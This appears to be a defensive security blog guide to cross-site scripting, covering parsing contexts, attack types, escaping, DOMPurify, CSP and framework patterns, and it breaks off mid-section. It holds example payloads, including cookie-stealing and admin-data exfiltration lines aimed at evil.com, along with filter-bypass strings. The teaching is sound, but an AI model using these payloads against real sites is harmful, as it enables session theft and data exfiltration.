---
title: Cross-Site Scripting (XSS)
description: Complete XSS deep-dive guide covering browser parsing internals, attack
  types, context-aware escaping, CSP, Trusted Types, React/Next.js/Astro security
  patterns, and enterprise frontend AppSec strategy
slug: xss
modifiedDate: '2026-05-21'
draft: false
featured: true
tags:
- security
- xss
- csp
- trusted-types
- browser-security
- sanitization
- frontend-security
categories:
- security
seo:
  title: Cross-Site Scripting (XSS) — Ultimate Deep-Dive Guide
  description: Complete XSS engineering guide covering browser parsing, attack types,
    context-aware escaping, CSP, Trusted Types, React/Next.js/Astro patterns, and
    enterprise frontend AppSec strategy
  canonical: https://feel-free.com/blogs/xss
  keywords:
  - xss
  - cross-site scripting
  - security
  - csp
  - content security policy
  - trusted types
  - sanitization
  - dompurify
  - browser security
author: lazarus2019
lang: en
relatedPosts:
- cors-and-proxy
- cors-and-proxy-quizs
- csp
- csrf
---

# Cross-Site Scripting (XSS) — Ultimate Deep-Dive Guide

A complete engineering guide from beginner concepts to browser-parsing-engine-level mental models and enterprise-scale secure frontend architecture.

---

## Table of Contents

1. [Big Picture](#1-big-picture)
2. [Browser Security & Parsing Deep Dive](#2-browser-security--parsing-deep-dive)
3. [Types of XSS Deep Dive](#3-types-of-xss-deep-dive)
4. [Context-Aware Escaping & Sanitization](#4-context-aware-escaping--sanitization)
5. [CSP & Trusted Types Deep Dive](#5-csp--trusted-types-deep-dive)
6. [React / Next.js / Astro XSS Deep Dive](#6-react--nextjs--astro-xss-deep-dive)
7. [Advanced Browser Security Concepts](#7-advanced-browser-security-concepts)
8. [Secure Architecture & Defense Strategy](#8-secure-architecture--defense-strategy)
9. [Setup Guide](#9-setup-guide)
10. [Security Tooling Comparison](#10-security-tooling-comparison)
11. [Cheatsheet](#11-cheatsheet)
12. [Real-World Engineering Mindset](#12-real-world-engineering-mindset)
13. [Brainstorm / Open Questions](#13-brainstorm--open-questions)
14. [Practice Questions](#14-practice-questions)
15. [Personalized Recommendations](#15-personalized-recommendations)
16. [Official Documentation & Reference Links](#16-official-documentation--reference-links)
17. [Advanced Engineering Topics](#17-advanced-engineering-topics)

---

## 1. Big Picture

### What XSS Actually Is

Cross-Site Scripting (XSS) is an injection attack where an attacker causes the victim's browser to execute malicious JavaScript within the context (origin) of a trusted website. The attacker's code runs with the same privileges as the legitimate site's own scripts — full access to cookies, DOM, storage, and authenticated APIs.

**The core problem:** The browser cannot distinguish between JavaScript that the site intended to run and JavaScript that an attacker injected.

### Why XSS Exists

XSS exists because of a fundamental design tension in the web platform:

1. **HTML mixes data and code** — content and executable scripts coexist in the same document
2. **Browsers are interpretation engines** — they parse HTML/CSS/JS and execute anything that looks like code
3. **User input flows into rendering** — applications dynamically construct HTML containing user data
4. **Context determines behavior** — the same characters mean different things in different parsing contexts
5. **The Same-Origin Policy grants full trust** — once code executes within an origin, it has complete access

```
┌──────────────────────────────────────────────────────────────┐
│                    XSS Mental Model                            │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│   Application takes user input                                │
│        │                                                       │
│        ▼                                                       │
│   Input is inserted into HTML without proper encoding         │
│        │                                                       │
│        ▼                                                       │
│   Browser parses HTML → encounters injected content           │
│        │                                                       │
│        ▼                                                       │
│   Parser interprets injection as executable code              │
│        │                                                       │
│        ▼                                                       │
│   JavaScript executes within the trusted origin               │
│        │                                                       │
│        ▼                                                       │
│   Attacker has full access: cookies, DOM, APIs, sessions      │
│                                                                │
│   ⚠️  Browser sees no difference from legitimate scripts       │
└──────────────────────────────────────────────────────────────┘
```

### XSS vs Related Attacks

| Attack | What it exploits | Mechanism | Impact scope |
|--------|-----------------|-----------|-------------|
| **XSS** | Trust site has in its own scripts | Inject code into trusted origin | Full origin access |
| **CSRF** | Trust server has in browser cookies | Forge requests from another site | Single action per request |
| **HTML Injection** | Rendering of user HTML without script exec | Insert markup (no JS) | Visual defacement, phishing |
| **DOM Clobbering** | Named DOM element access patterns | Override JS variables via HTML | Logic manipulation |
| **Template Injection** | Server-side template engines | Inject template syntax | Server-side code execution |
| **Injection (SQL, etc.)** | Data/code boundary confusion | Inject into interpreter syntax | Backend data/systems |

**Key distinctions:**
- XSS = **code execution in the browser within the victim's session**
- CSRF = **action execution on the server via the victim's credentials**
- XSS can **perform CSRF** (and much more) — it's strictly more powerful

### Browser Trust Model & XSS

```
┌──────────────────────────────────────────────────────────────┐
│              Browser Origin Trust Model                        │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Origin: https://app.example.com                              │
│                                                                │
│  All scripts running in this origin can:                      │
│    ✓ Read/write all cookies (non-httpOnly)                   │
│    ✓ Access localStorage/sessionStorage                      │
│    ✓ Read/modify the entire DOM                              │
│    ✓ Make authenticated fetch/XHR requests                   │
│    ✓ Access browser APIs (camera, location, etc.)            │
│    ✓ Redirect the user                                       │
│    ✓ Intercept form submissions                              │
│    ✓ Modify page content (phishing)                          │
│    ✓ Install service workers                                 │
│                                                                │
│  If attacker achieves XSS → they get ALL of the above        │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### XSS Attack Lifecycle

```
1. UNTRUSTED INPUT ENTERS APPLICATION
   User comment, URL parameter, header, database field, API response

2. APPLICATION PROCESSES INPUT
   May store it, reflect it, or use it in client-side logic

3. INPUT IS PLACED INTO HTML/DOM
   Server renders into template OR client inserts into DOM

4. BROWSER PARSES THE DOCUMENT
   HTML parser encounters the injected content

5. PARSER INTERPRETS AS CODE
   Injection crosses context boundary → becomes executable

6. SCRIPT EXECUTES IN TRUSTED ORIGIN
   Attacker's code runs with full privileges of the site

7. EXPLOITATION
   Cookie theft, session hijacking, keylogging, data exfiltration,
   account takeover, cryptomining, worm propagation
```

### XSS Types Comparison

| Type | Input source | Storage | Execution trigger | Detection difficulty |
|------|-------------|---------|-------------------|---------------------|
| **Reflected** | URL/request | None (immediate) | Victim clicks malicious link | Easy (server-side scan) |
| **Stored** | Database/persistent | Server stores payload | Any user views the content | Medium (output scan) |
| **DOM-based** | URL/client data | None | Client-side JS processes input | Hard (no server involvement) |
| **Mutation** | HTML that mutates during parsing | Varies | Browser parser transformation | Very hard (parser-dependent) |
| **Blind** | Input stored elsewhere | Server stores | Admin/different user views | Hard (no immediate feedback) |

### When XSS Becomes Critical

- **Session hijacking:** Steal httpOnly cookies via response interception or token theft
- **Account takeover:** Change email/password, add attacker's auth method
- **Data exfiltration:** Read sensitive data, PII, financial info from DOM/APIs
- **Keylogging:** Capture credentials as user types
- **Phishing:** Modify page to show fake login form within the trusted domain
- **Worm propagation:** Self-replicating XSS (Samy worm, 2005)
- **Cryptomining:** Hijack user's CPU
- **Supply chain:** Compromise shared components → XSS across all consumers

### Real-World Impact

- **2005 — Samy Worm (MySpace):** Stored XSS worm gained 1M followers in 20 hours
- **2018 — British Airways:** Magecart XSS stole 380,000 payment cards
- **2019 — Fortnite:** XSS in account system → account takeover
- **2020 — Apple iCloud:** Stored XSS in mail allowing full account access
- **2021 — Gitlab:** Stored XSS in issue descriptions
- **2023 — Multiple CDNs:** Supply-chain XSS via compromised third-party scripts

---

## 2. Browser Security & Parsing Deep Dive

### HTML Parsing Contexts

The browser's HTML parser operates in multiple **contexts**. The same characters have completely different meanings depending on which context they appear in:

```
┌─────────────────────────────────────────────────────────────┐
│              HTML Parsing Contexts                            │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  1. HTML ELEMENT CONTENT                                     │
│     <div>USER INPUT HERE</div>                               │
│     Dangerous: < > (start new tags)                         │
│     Escape: &lt; &gt; &amp;                                 │
│                                                               │
│  2. HTML ATTRIBUTE VALUE                                     │
│     <div class="USER INPUT HERE">                            │
│     Dangerous: " ' (break out of attribute)                 │
│     Escape: &quot; &#x27;                                   │
│                                                               │
│  3. JAVASCRIPT CONTEXT                                       │
│     <script>var x = "USER INPUT HERE";</script>              │
│     Dangerous: " \ / </script> (break string or tag)        │
│     Escape: \x22 \x27 \x5c + close-tag awareness           │
│                                                               │
│  4. URL CONTEXT                                              │
│     <a href="USER INPUT HERE">                               │
│     Dangerous: javascript: data: vbscript:                  │
│     Defense: URL validation + encoding                      │
│                                                               │
│  5. CSS CONTEXT                                              │
│     <div style="USER INPUT HERE">                            │
│     Dangerous: expression() url() behavior:                 │
│     Defense: CSS value validation                           │
│                                                               │
│  6. HTML COMMENT                                             │
│     <!-- USER INPUT HERE -->                                 │
│     Dangerous: --> (close comment, start HTML)              │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### Why Context Matters

```html
<!-- Input: "><img src=x onerror=alert(1)> -->

<!-- Context 1: HTML element content → SAFE (displayed as text with encoding) -->
<div>&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</div>

<!-- Context 2: Unquoted attribute → VULNERABLE -->
<div title="><img src=x onerror=alert(1)>></div>

<!-- Context 3: Inside script → Different escaping needed -->
<script>var x = "\"><img src=x onerror=alert(1)>";</script>

<!-- Context 4: href attribute → javascript: scheme possible -->
<a href="javascript:alert(1)">Click</a>
```

### Dangerous DOM APIs (Sinks)

```javascript
// ❌ DANGEROUS — Directly execute/render user input
element.innerHTML = userInput;           // HTML parsing
element.outerHTML = userInput;           // HTML parsing
document.write(userInput);               // HTML parsing
document.writeln(userInput);             // HTML parsing
element.insertAdjacentHTML(pos, input);  // HTML parsing

// ❌ DANGEROUS — URL-based execution
location.href = userInput;               // javascript: URLs
location.assign(userInput);              // javascript: URLs
window.open(userInput);                  // javascript: URLs
element.src = userInput;                 // script/iframe src
element.href = userInput;                // anchor javascript:

// ❌ DANGEROUS — Code execution
eval(userInput);                         // Direct execution
setTimeout(userInput, 0);               // String-form execution
setInterval(userInput, 0);              // String-form execution
new Function(userInput);                 // Dynamic function
element.setAttribute("onclick", input); // Event handler

// ✅ SAFE — Text-only APIs
element.textContent = userInput;         // No parsing
element.innerText = userInput;           // No parsing (legacy)
document.createTextNode(userInput);      // Text node only
element.setAttribute("title", input);   // Non-event attributes (with encoding)
```

### How Browsers Decide to Execute

```
Browser receives HTML content:

1. TOKENIZER breaks input into tokens:
   - Start tags, end tags, attributes, text, comments
   
2. TREE CONSTRUCTOR builds DOM tree:
   - Creates elements, assigns attributes
   - Detects <script> → pauses parsing → executes
   
3. EXECUTION TRIGGERS:
   - <script>...</script>           → immediate execution
   - <script src="...">            → fetch + execute
   - <img onerror="...">           → execute on error event
   - <body onload="...">           → execute on load
   - <a href="javascript:...">     → execute on click
   - element.innerHTML = "..."     → parse + potentially execute
   - eval(), setTimeout(string)    → execute string as code
   
4. KEY INSIGHT:
   The parser does NOT know if content is "user input" or "developer code"
   It only sees characters and applies parsing rules
```

### Parser Differentials (Mutation XSS)

Different parsing paths can transform "safe" HTML into dangerous HTML:

```html
<!-- Input appears safe -->
<div><style><img src=x onerror=alert(1)></style></div>

<!-- But in innerHTML context, <style> content is treated as raw text -->
<!-- Browser might not parse <img> inside <style> the same way -->

<!-- Mutation XSS example: -->
<!-- Input: -->
<noscript><img src=x onerror=alert(1)></noscript>
<!-- In innerHTML (scripting enabled), <noscript> content parsed as raw text -->
<!-- But after DOM serialization + re-parse, it might execute -->
```

**Why this matters:** Sanitizers parse HTML one way, but the browser may parse the sanitized output differently. This gap creates mutation XSS.

### Browser Engine Differences

| Behavior | Chromium (Blink) | Firefox (Gecko) | Safari (WebKit) |
|----------|-----------------|-----------------|-----------------|
| innerHTML parsing | DOMParser mode | DOMParser mode | DOMParser mode |
| SVG foreignObject | Allows HTML context switch | Allows HTML context switch | Allows HTML context switch |
| Custom elements in SVG | May differ | May differ | May differ |
| MathML parsing | Limited | Full | Limited |
| Mutation on paste | Sanitizes differently | Sanitizes differently | Sanitizes differently |

---

## 3. Types of XSS Deep Dive

### 3.1 Reflected XSS

**Payload is in the request, immediately reflected in the response.**

```
Attack flow:
1. Attacker crafts URL: https://target.com/search?q=<script>alert(1)</script>
2. Victim clicks link (via phishing, forum post, etc.)
3. Server includes query param in response HTML without encoding
4. Browser executes the script in target.com's origin
```

```javascript
// Vulnerable server code (Express)
app.get("/search", (req, res) => {
  const query = req.query.q;
  // ❌ Directly embedding user input in HTML
  res.send(`<h1>Results for: ${query}</h1>`);
});

// Attack: /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Mitigation:**
- Context-aware output encoding
- CSP with strict nonces
- Framework auto-escaping (React, Next.js)

### 3.2 Stored XSS

**Payload is persisted (database, file, etc.) and rendered to other users.**

```
Attack flow:
1. Attacker submits malicious content (comment, profile, message)
2. Server stores the payload in database
3. Other users view the page containing stored content
4. Browser executes stored payload in each victim's session
```

```javascript
// Vulnerable: Rendering stored user content
app.get("/comments/:id", async (req, res) => {
  const comment = await db.getComment(req.params.id);
  // ❌ Stored content rendered without encoding
  res.send(`<div class="comment">${comment.body}</div>`);
});

// Attacker stored: <img src=x onerror="fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('https://evil.com/exfil',{method:'POST',body:JSON.stringify(d)}))">
```

**Why stored XSS is more dangerous:**
- No user interaction beyond normal browsing
- Affects ALL users who view the content
- Can target administrators/privileged users
- Harder to detect (no suspicious URLs)
- Can become self-propagating (worms)

### 3.3 DOM-Based XSS

**Entirely client-side — the server never sees or reflects the payload.**

```javascript
// Vulnerable client-side code
const hash = location.hash.substring(1);
document.getElementById("output").innerHTML = decodeURIComponent(hash);

// Attack: https://target.com/page#<img src=x onerror=alert(document.cookie)>
```

```javascript
// Common DOM XSS patterns:

// Source: where attacker-controlled data enters
const sources = [
  location.hash,
  location.search,
  location.href,
  document.referrer,
  document.cookie,
  window.name,
  postMessage data,
  localStorage/sessionStorage,
  IndexedDB,
  WebSocket messages,
];

// Sink: where data causes execution
const sinks = [
  "innerHTML",
  "outerHTML",
  "document.write",
  "eval",
  "setTimeout(string)",
  "setInterval(string)",
  "new Function(string)",
  "element.src",
  "element.href (javascript:)",
  "jQuery.html()",
  "$.append()",
  "v-html (Vue)",
  "dangerouslySetInnerHTML (React)",
];
```

**Why DOM XSS is hard to detect:**
- No server involvement — WAFs can't see it
- Payload may not appear in HTTP traffic
- Static analysis of client JS is complex
- Dynamic sources (postMessage, storage) are hard to trace

### 3.4 Mutation XSS (mXSS)

**Exploits differences between how sanitizers parse HTML and how browsers render it.**

```html
<!-- DOMPurify (or similar) sees this as safe: -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

<!-- But after browser processes it: -->
<!-- The parser moves elements due to foster parenting / tree construction rules -->
<!-- Result: <img> ends up outside <style>, executing the onerror handler -->
```

**Why mXSS is dangerous:**
- Bypasses sanitizers that use different parsing than the rendering browser
- Exploits HTML spec's complex error recovery rules
- New mXSS vectors are discovered periodically
- Requires deep knowledge of HTML parser state machines

**Defense:** Use battle-tested sanitizers (DOMPurify) that track mXSS vectors, keep them updated, and combine with CSP.

### 3.5 SVG-Based XSS

SVG is a rich attack surface because it supports both XML and embedded HTML:

```html
<!-- SVG with embedded script -->
<svg onload="alert(1)">
<svg><script>alert(1)</script></svg>

<!-- SVG foreignObject allows HTML context -->
<svg><foreignObject><body onload="alert(1)"></body></foreignObject></svg>

<!-- SVG in image context (usually safe — no script execution) -->
<img src="evil.svg"> <!-- Scripts DON'T execute -->

<!-- SVG inline or via <object>/<embed> — scripts DO execute -->
<object data="evil.svg"></object> <!-- Scripts execute -->
```

### 3.6 Markdown Rendering XSS

```markdown
<!-- Dangerous if renderer allows raw HTML -->
<img src=x onerror=alert(1)>

<!-- Link-based XSS -->
[Click me](javascript:alert(1))

<!-- Image with event handler (if renderer doesn't sanitize) -->
![alt](x" onerror="alert(1))
```

**Defense:** Use Markdown renderers with HTML disabled or sanitized output (remark + rehype-sanitize, markdown-it with html: false).

### 3.7 Blind XSS

**Payload executes in a different context than where it was submitted:**

```
Attack flow:
1. Attacker submits XSS payload in support ticket, contact form, log entry
2. Payload stored but never rendered to attacker
3. Admin/support agent views the content in internal dashboard
4. Payload executes in admin's higher-privilege session
```

**Detection:** Use blind XSS platforms (XSS Hunter, custom callbacks) that notify when payloads execute.

---

## 4. Context-Aware Escaping & Sanitization

### The Golden Rule

**You must encode output based on the context where it will be rendered, not based on where the input came from.**

### Context-Specific Encoding

```typescript
// context-encoding.ts

// 1. HTML Element Content
function encodeForHTML(input: string): string {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

// 2. HTML Attribute Value (always quote attributes!)
function encodeForAttribute(input: string): string {
  // Same as HTML encoding when attributes are quoted
  return encodeForHTML(input);
}

// 3. JavaScript String Context
function encodeForJS(input: string): string {
  return input.replace(/[\\'"\/\n\r\u2028\u2029<>]/g, (char) => {
    return "\\x" + char.charCodeAt(0).toString(16).padStart(2, "0");
  });
}

// 4. URL Parameter
function encodeForURL(input: string): string {
  return encodeURIComponent(input);
}

// 5. CSS Value
function encodeForCSS(input: string): string {
  return input.replace(/[^a-zA-Z0-9]/g, (char) => {
    return "\\" + char.charCodeAt(0).toString(16) + " ";
  });
}
```

### URL Validation (Preventing javascript: URLs)

```typescript
function isSafeURL(url: string): boolean {
  try {
    const parsed = new URL(url, window.location.origin);
    // Only allow http(s) protocols
    return ["http:", "https:", "mailto:"].includes(parsed.protocol);
  } catch {
    return false; // Invalid URL
  }
}

// Usage in React
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  if (!isSafeURL(href)) {
    return <span>{children}</span>; // Render as plain text
  }
  return <a href={href}>{children}</a>;
}
```

### Why Regex Sanitization Fails

```javascript
// ❌ BROKEN: Regex-based HTML stripping
function stripTags(input) {
  return input.replace(/<[^>]*>/g, "");
}

// Bypasses:
stripTags("<img src=x onerror=alert(1)//>");  // Might partially work
stripTags("<img src=x onerror=alert(1) ");    // No closing > → regex fails
stripTags("<<script>alert(1)</script>");       // Double bracket bypass
stripTags("<scr<script>ipt>alert(1)</scr</script>ipt>"); // Nested
```

```javascript
// ❌ BROKEN: Blacklist approach
function sanitize(input) {
  return input
    .replace(/script/gi, "")
    .replace(/onerror/gi, "")
    .replace(/onclick/gi, "");
}

// Bypasses:
sanitize("<scrscriptipt>alert(1)</scrscriptipt>"); // → <script>alert(1)</script>
sanitize("<img src=x oOnErrornerror=alert(1)>");   // Case tricks
sanitize("<svg/onload=alert(1)>");                  // Different event
sanitize("<img src=x onerr\u006Fr=alert(1)>");    // Unicode escape
```

### DOMPurify — The Standard

```typescript
import DOMPurify from "dompurify";

// Basic usage
const clean = DOMPurify.sanitize(dirty);

// Strict configuration
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li"],
  ALLOWED_ATTR: ["href", "target", "rel"],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ["target"], // Force target="_blank" on links
  FORBID_TAGS: ["style", "script", "iframe", "object", "embed", "form"],
  FORBID_ATTR: ["style", "onerror", "onload", "onclick"],
});

// Hook to force rel="noopener" on links
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A") {
    node.setAttribute("target", "_blank");
    node.setAttribute("rel", "noopener noreferrer");
  }
});

// For React
function SafeHTML({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, { RETURN_DOM_FRAGMENT: false });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### Escaping vs Sanitization

| Approach | When to use | What it does | Risk |
|----------|-------------|-------------|------|
| **Escaping** | Plain text display | Encodes special chars as entities | Low (preserves all content as text) |
| **Sanitization** | Rich HTML allowed | Removes dangerous elements/attributes | Medium (parser differentials) |
| **Validation** | Structured input (email, URL) | Rejects invalid input entirely | Low (but may be too strict) |
| **Stripping** | Remove all HTML | Remove tags entirely | Medium (regex failures) |

**Rule of thumb:**
- If you DON'T need HTML rendering → **escape** (safest)
- If you need rich text → **sanitize with DOMPurify** (necessary risk)
- NEVER use regex for HTML security

---

## 5. CSP & Trusted Types Deep Dive

### Content Security Policy (CSP)

CSP is a **browser-enforced security layer** that restricts what resources can be loaded and what code can be executed.

```
┌──────────────────────────────────────────────────────────────┐
│                CSP Defense Model                               │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  WITHOUT CSP:                                                 │
│    XSS payload injects <script>evil()</script>               │
│    Browser: "It's a script in this origin — execute it"      │
│    Result: ❌ Attack succeeds                                 │
│                                                                │
│  WITH STRICT CSP:                                            │
│    XSS payload injects <script>evil()</script>               │
│    Browser: "This script has no valid nonce — block it"      │
│    Result: ✅ Attack BLOCKED (script doesn't execute)         │
│                                                                │
│  CSP doesn't prevent injection — it prevents EXECUTION       │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### Strict CSP (Recommended)

```http
# Nonce-based strict CSP (best for SSR apps)
Content-Security-Policy: 
  default-src 'none';
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  style-src 'nonce-{RANDOM}';
  img-src 'self' https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'none';
  form-action 'self';
  upgrade-insecure-requests;

# Hash-based (for static pages)
Content-Security-Policy:
  script-src 'sha256-{HASH_OF_SCRIPT}' 'strict-dynamic';
```

### CSP Directives Reference

| Directive | Controls | XSS relevance |
|-----------|----------|---------------|
| `script-src` | JavaScript execution | **Primary XSS defense** |
| `style-src` | CSS loading/inline | CSS injection prevention |
| `default-src` | Fallback for all | Baseline restriction |
| `img-src` | Image loading | Data exfiltration via img |
| `connect-src` | fetch/XHR/WebSocket | Data exfiltration |
| `frame-src` | iframe sources | Clickjacking + embedding |
| `frame-ancestors` | Who can frame this page | Clickjacking defense |
| `base-uri` | `<base>` tag | Relative URL hijacking |
| `form-action` | Form submission targets | Credential phishing |
| `object-src` | Flash/Java plugins | Legacy plugin execution |
| `require-trusted-types-for` | DOM sink protection | **DOM XSS defense** |

### Why CSP Is Hard

| Challenge | Why | Mitigation |
|-----------|-----|-----------|
| Inline scripts everywhere | Legacy code, analytics, A/B testing | Nonces, refactor to external scripts |
| Third-party scripts | Marketing, analytics, chat widgets | strict-dynamic, script integrity |
| eval() usage | Libraries, template engines | Refactor, 'unsafe-eval' (weakens CSP) |
| Inline styles | CSS-in-JS, component libraries | Nonces for styles, or style-src 'unsafe-inline' (acceptable trade-off) |
| Dynamic script creation | Module loaders, lazy loading | strict-dynamic propagates trust |
| Report noise | Browser extensions trigger violations | Filter reports, analyze patterns |

### Trusted Types

Trusted Types is a **browser API** that prevents DOM XSS by requiring typed objects for dangerous DOM sinks:

```typescript
// Without Trusted Types:
element.innerHTML = userInput; // Accepts any string → XSS possible

// With Trusted Types enforced:
element.innerHTML = userInput; // TypeError! String not allowed.
element.innerHTML = trustedHTML; // Only TrustedHTML objects accepted.
```

```typescript
// Creating a Trusted Types policy
if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy("default", {
    createHTML: (input: string) => {
      return DOMPurify.sanitize(input); // Sanitize before allowing
    },
    createScriptURL: (input: string) => {
      if (ALLOWED_SCRIPT_URLS.some(url => input.startsWith(url))) {
        return input;
      }
      throw new Error(`Blocked script URL: ${input}`);
    },
    createScript: (input: string) => {
      throw new Error("Script creation blocked by Trusted Types");
    },
  });
}

// Usage — this now goes through the policy's sanitization
element.innerHTML = policy.createHTML(userContent);
```

```http
# Enable Trusted Types enforcement
Content-Security-Policy: require-trusted-types-for 'script';
# Or report-only first:
Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; report-uri /csp-report;
```

### React CSP Strategy

```typescript
// next.config.js — Next.js CSP with nonces
const { headers } = require("next/headers");

// middleware.ts — Generate nonce per request
import { NextResponse } from "next/server";
import crypto from "crypto";

export function middleware(request) {
  const nonce = crypto.randomBytes(16).toString("base64");
  
  const csp = [
    `default-src 'none'`,
    `script-src 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'nonce-${nonce}' 'unsafe-inline'`, // CSS-in-JS needs this
    `img-src 'self' https: data:`,
    `font-src 'self'`,
    `connect-src 'self' ${process.env.API_URL}`,
    `frame-ancestors 'none'`,
    `base-uri 'none'`,
    `form-action 'self'`,
  ].join("; ");
  
  const response = NextResponse.next();
  response.headers.set("Content-Security-Policy", csp);
  response.headers.set("X-Nonce", nonce); // Pass to rendering
  return response;
}
```

### Astro CSP Strategy

```typescript
// astro.config.mjs — Security headers
export default defineConfig({
  integrations: [],
  vite: {
    plugins: [
      {
        name: "security-headers",
        configureServer(server) {
          server.middlewares.use((req, res, next) => {
            const nonce = crypto.randomBytes(16).toString("base64");
            res.setHeader("Content-Security-Policy",
              `script-src 'nonce-${nonce}' 'strict-dynamic'; ` +
              `style-src 'self' 'unsafe-inline'; ` +
              `default-src 'none'; ` +
              `img-src 'self' https:; ` +
              `connect-src 'self';`
            );
            next();
          });
        },
      },
    ],
  },
});
```

---

## 6. React / Next.js / Astro XSS Deep Dive

### Why React Is Safer by Default

React automatically escapes values interpolated in JSX:

```tsx
// ✅ SAFE — React escapes this automatically
const userInput = '<script>alert("xss")</script>';
return <div>{userInput}</div>;
// Renders: <div>&lt;script&gt;alert("xss")&lt;/script&gt;</div>

// React's JSX compiles to React.createElement which uses textContent internally
// No HTML parsing occurs — it's always treated as text
```

### When React IS Vulnerable

```tsx
// ❌ VULNERABLE: dangerouslySetInnerHTML
function Comment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
// If `html` comes from user input without sanitization → XSS

// ❌ VULNERABLE: href with javascript: scheme
function Link({ url }: { url: string }) {
  return <a href={url}>Click</a>;
}
// <Link url="javascript:alert(1)" /> → XSS on click

// ❌ VULNERABLE: Rendering into DOM ref
function Widget({ content }: { content: string }) {
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    ref.current!.innerHTML = content; // Bypasses React's escaping
  }, [content]);
  return <div ref={ref} />;
}

// ❌ VULNERABLE: Dynamic component creation from user input
function DynamicComponent({ tag }: { tag: string }) {
  const Tag = tag as keyof JSX.IntrinsicElements; // If tag = "script" → danger
  return <Tag>content</Tag>;
}

// ❌ VULNERABLE: Server-side rendering injection
// In SSR, if user input is embedded in the initial HTML string
// before React hydration, it can execute during parsing
```

### Safe React Patterns

```tsx
// ✅ Safe rich text with DOMPurify
import DOMPurify from "isomorphic-dompurify";

function SafeRichText({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li", "h1", "h2", "h3"],
    ALLOWED_ATTR: ["href", "target", "rel"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// ✅ Safe URL handling
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  const isSafe = useMemo(() => {
    try {
      const url = new URL(href, window.location.origin);
      return ["http:", "https:", "mailto:"].includes(url.protocol);
    } catch {
      return false;
    }
  }, [href]);

  if (!isSafe) return <span>{children}</span>;
  return <a href={href} rel="noopener noreferrer">{children}</a>;
}

// ✅ Safe Markdown rendering
import ReactMarkdown from "react-markdown";
import rehypeSanitize from "rehype-sanitize";

function SafeMarkdown({ content }: { content: string }) {
  return (
    <ReactMarkdown rehypePlugins={[rehypeSanitize]}>
      {content}
    </ReactMarkdown>
  );
}
```

### Next.js XSS Considerations

```tsx
// SSR Injection Risk: Server Components render HTML on server
// If user data flows into HTML without encoding → XSS

// ✅ SAFE: Next.js Server Component with React escaping
async function UserProfile({ userId }: { userId: string }) {
  const user = await getUser(userId);
  return <h1>{user.name}</h1>; // React auto-escapes
}

// ❌ DANGEROUS: Dynamic metadata from user input
export async function generateMetadata({ params }) {
  const post = await getPost(params.id);
  return {
    title: post.title, // What if title contains HTML entities?
    // Next.js handles this safely, but custom meta tags may not
  };
}

// ❌ DANGEROUS: Streaming HTML with user data
// If using experimental streaming and injecting user data into
// the HTML stream directly, bypass React's escaping

// Security headers in Next.js
// next.config.js
module.exports = {
  async headers() {
    return [{
      source: "/(.*)",
      headers: [
        { key: "X-Content-Type-Options", value: "nosniff" },
        { key: "X-Frame-Options", value: "DENY" },
        { key: "X-XSS-Protection", value: "0" }, // Disable legacy XSS filter
        { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
      ],
    }];
  },
};
```

### Astro XSS Considerations

```astro
---
// src/pages/post/[id].astro
const { id } = Astro.params;
const post = await getPost(id);
---

<!-- ✅ SAFE: Astro auto-escapes expressions -->
<h1>{post.title}</h1>
<p>{post.content}</p>

<!-- ❌ DANGEROUS: set:html directive with user content -->
<div set:html={post.htmlContent}></div>
<!-- Must sanitize first! -->

<!-- ✅ SAFE: Sanitize before set:html -->
---
import DOMPurify from "isomorphic-dompurify";
const cleanHTML = DOMPurify.sanitize(post.htmlContent);
---
<div set:html={cleanHTML}></div>
```

### Hydration-Based XSS

```
┌──────────────────────────────────────────────────────────────┐
│              Hydration XSS Risk                               │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Server renders: <div id="root">Safe Content</div>           │
│                                                                │
│  If attacker can modify the HTML before hydration             │
│  (cache poisoning, CDN injection, proxy manipulation):       │
│                                                                │
│  Modified: <div id="root"><img src=x onerror=alert(1)></div> │
│                                                                │
│  React hydration may:                                         │
│  1. Accept the mismatched DOM (development: warning)         │
│  2. Or in some cases, keep existing DOM nodes                │
│                                                                │
│  Risk: If React keeps attacker-injected nodes → XSS          │
│                                                                │
│  Mitigation:                                                  │
│  - Integrity checks on SSR output                            │
│  - CSP prevents inline script execution                      │
│  - SRI on external scripts                                   │
│  - Subresource integrity                                     │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

---

## 7. Advanced Browser Security Concepts

### DOM Clobbering

DOM clobbering exploits named element access in JavaScript:

```html
<!-- Attacker injects (e.g., via HTML injection without script execution): -->
<form id="document"><input name="cookie" value="clobbered"></form>
<!-- or -->
<a id="config" href="https://evil.com/config.json"></a>

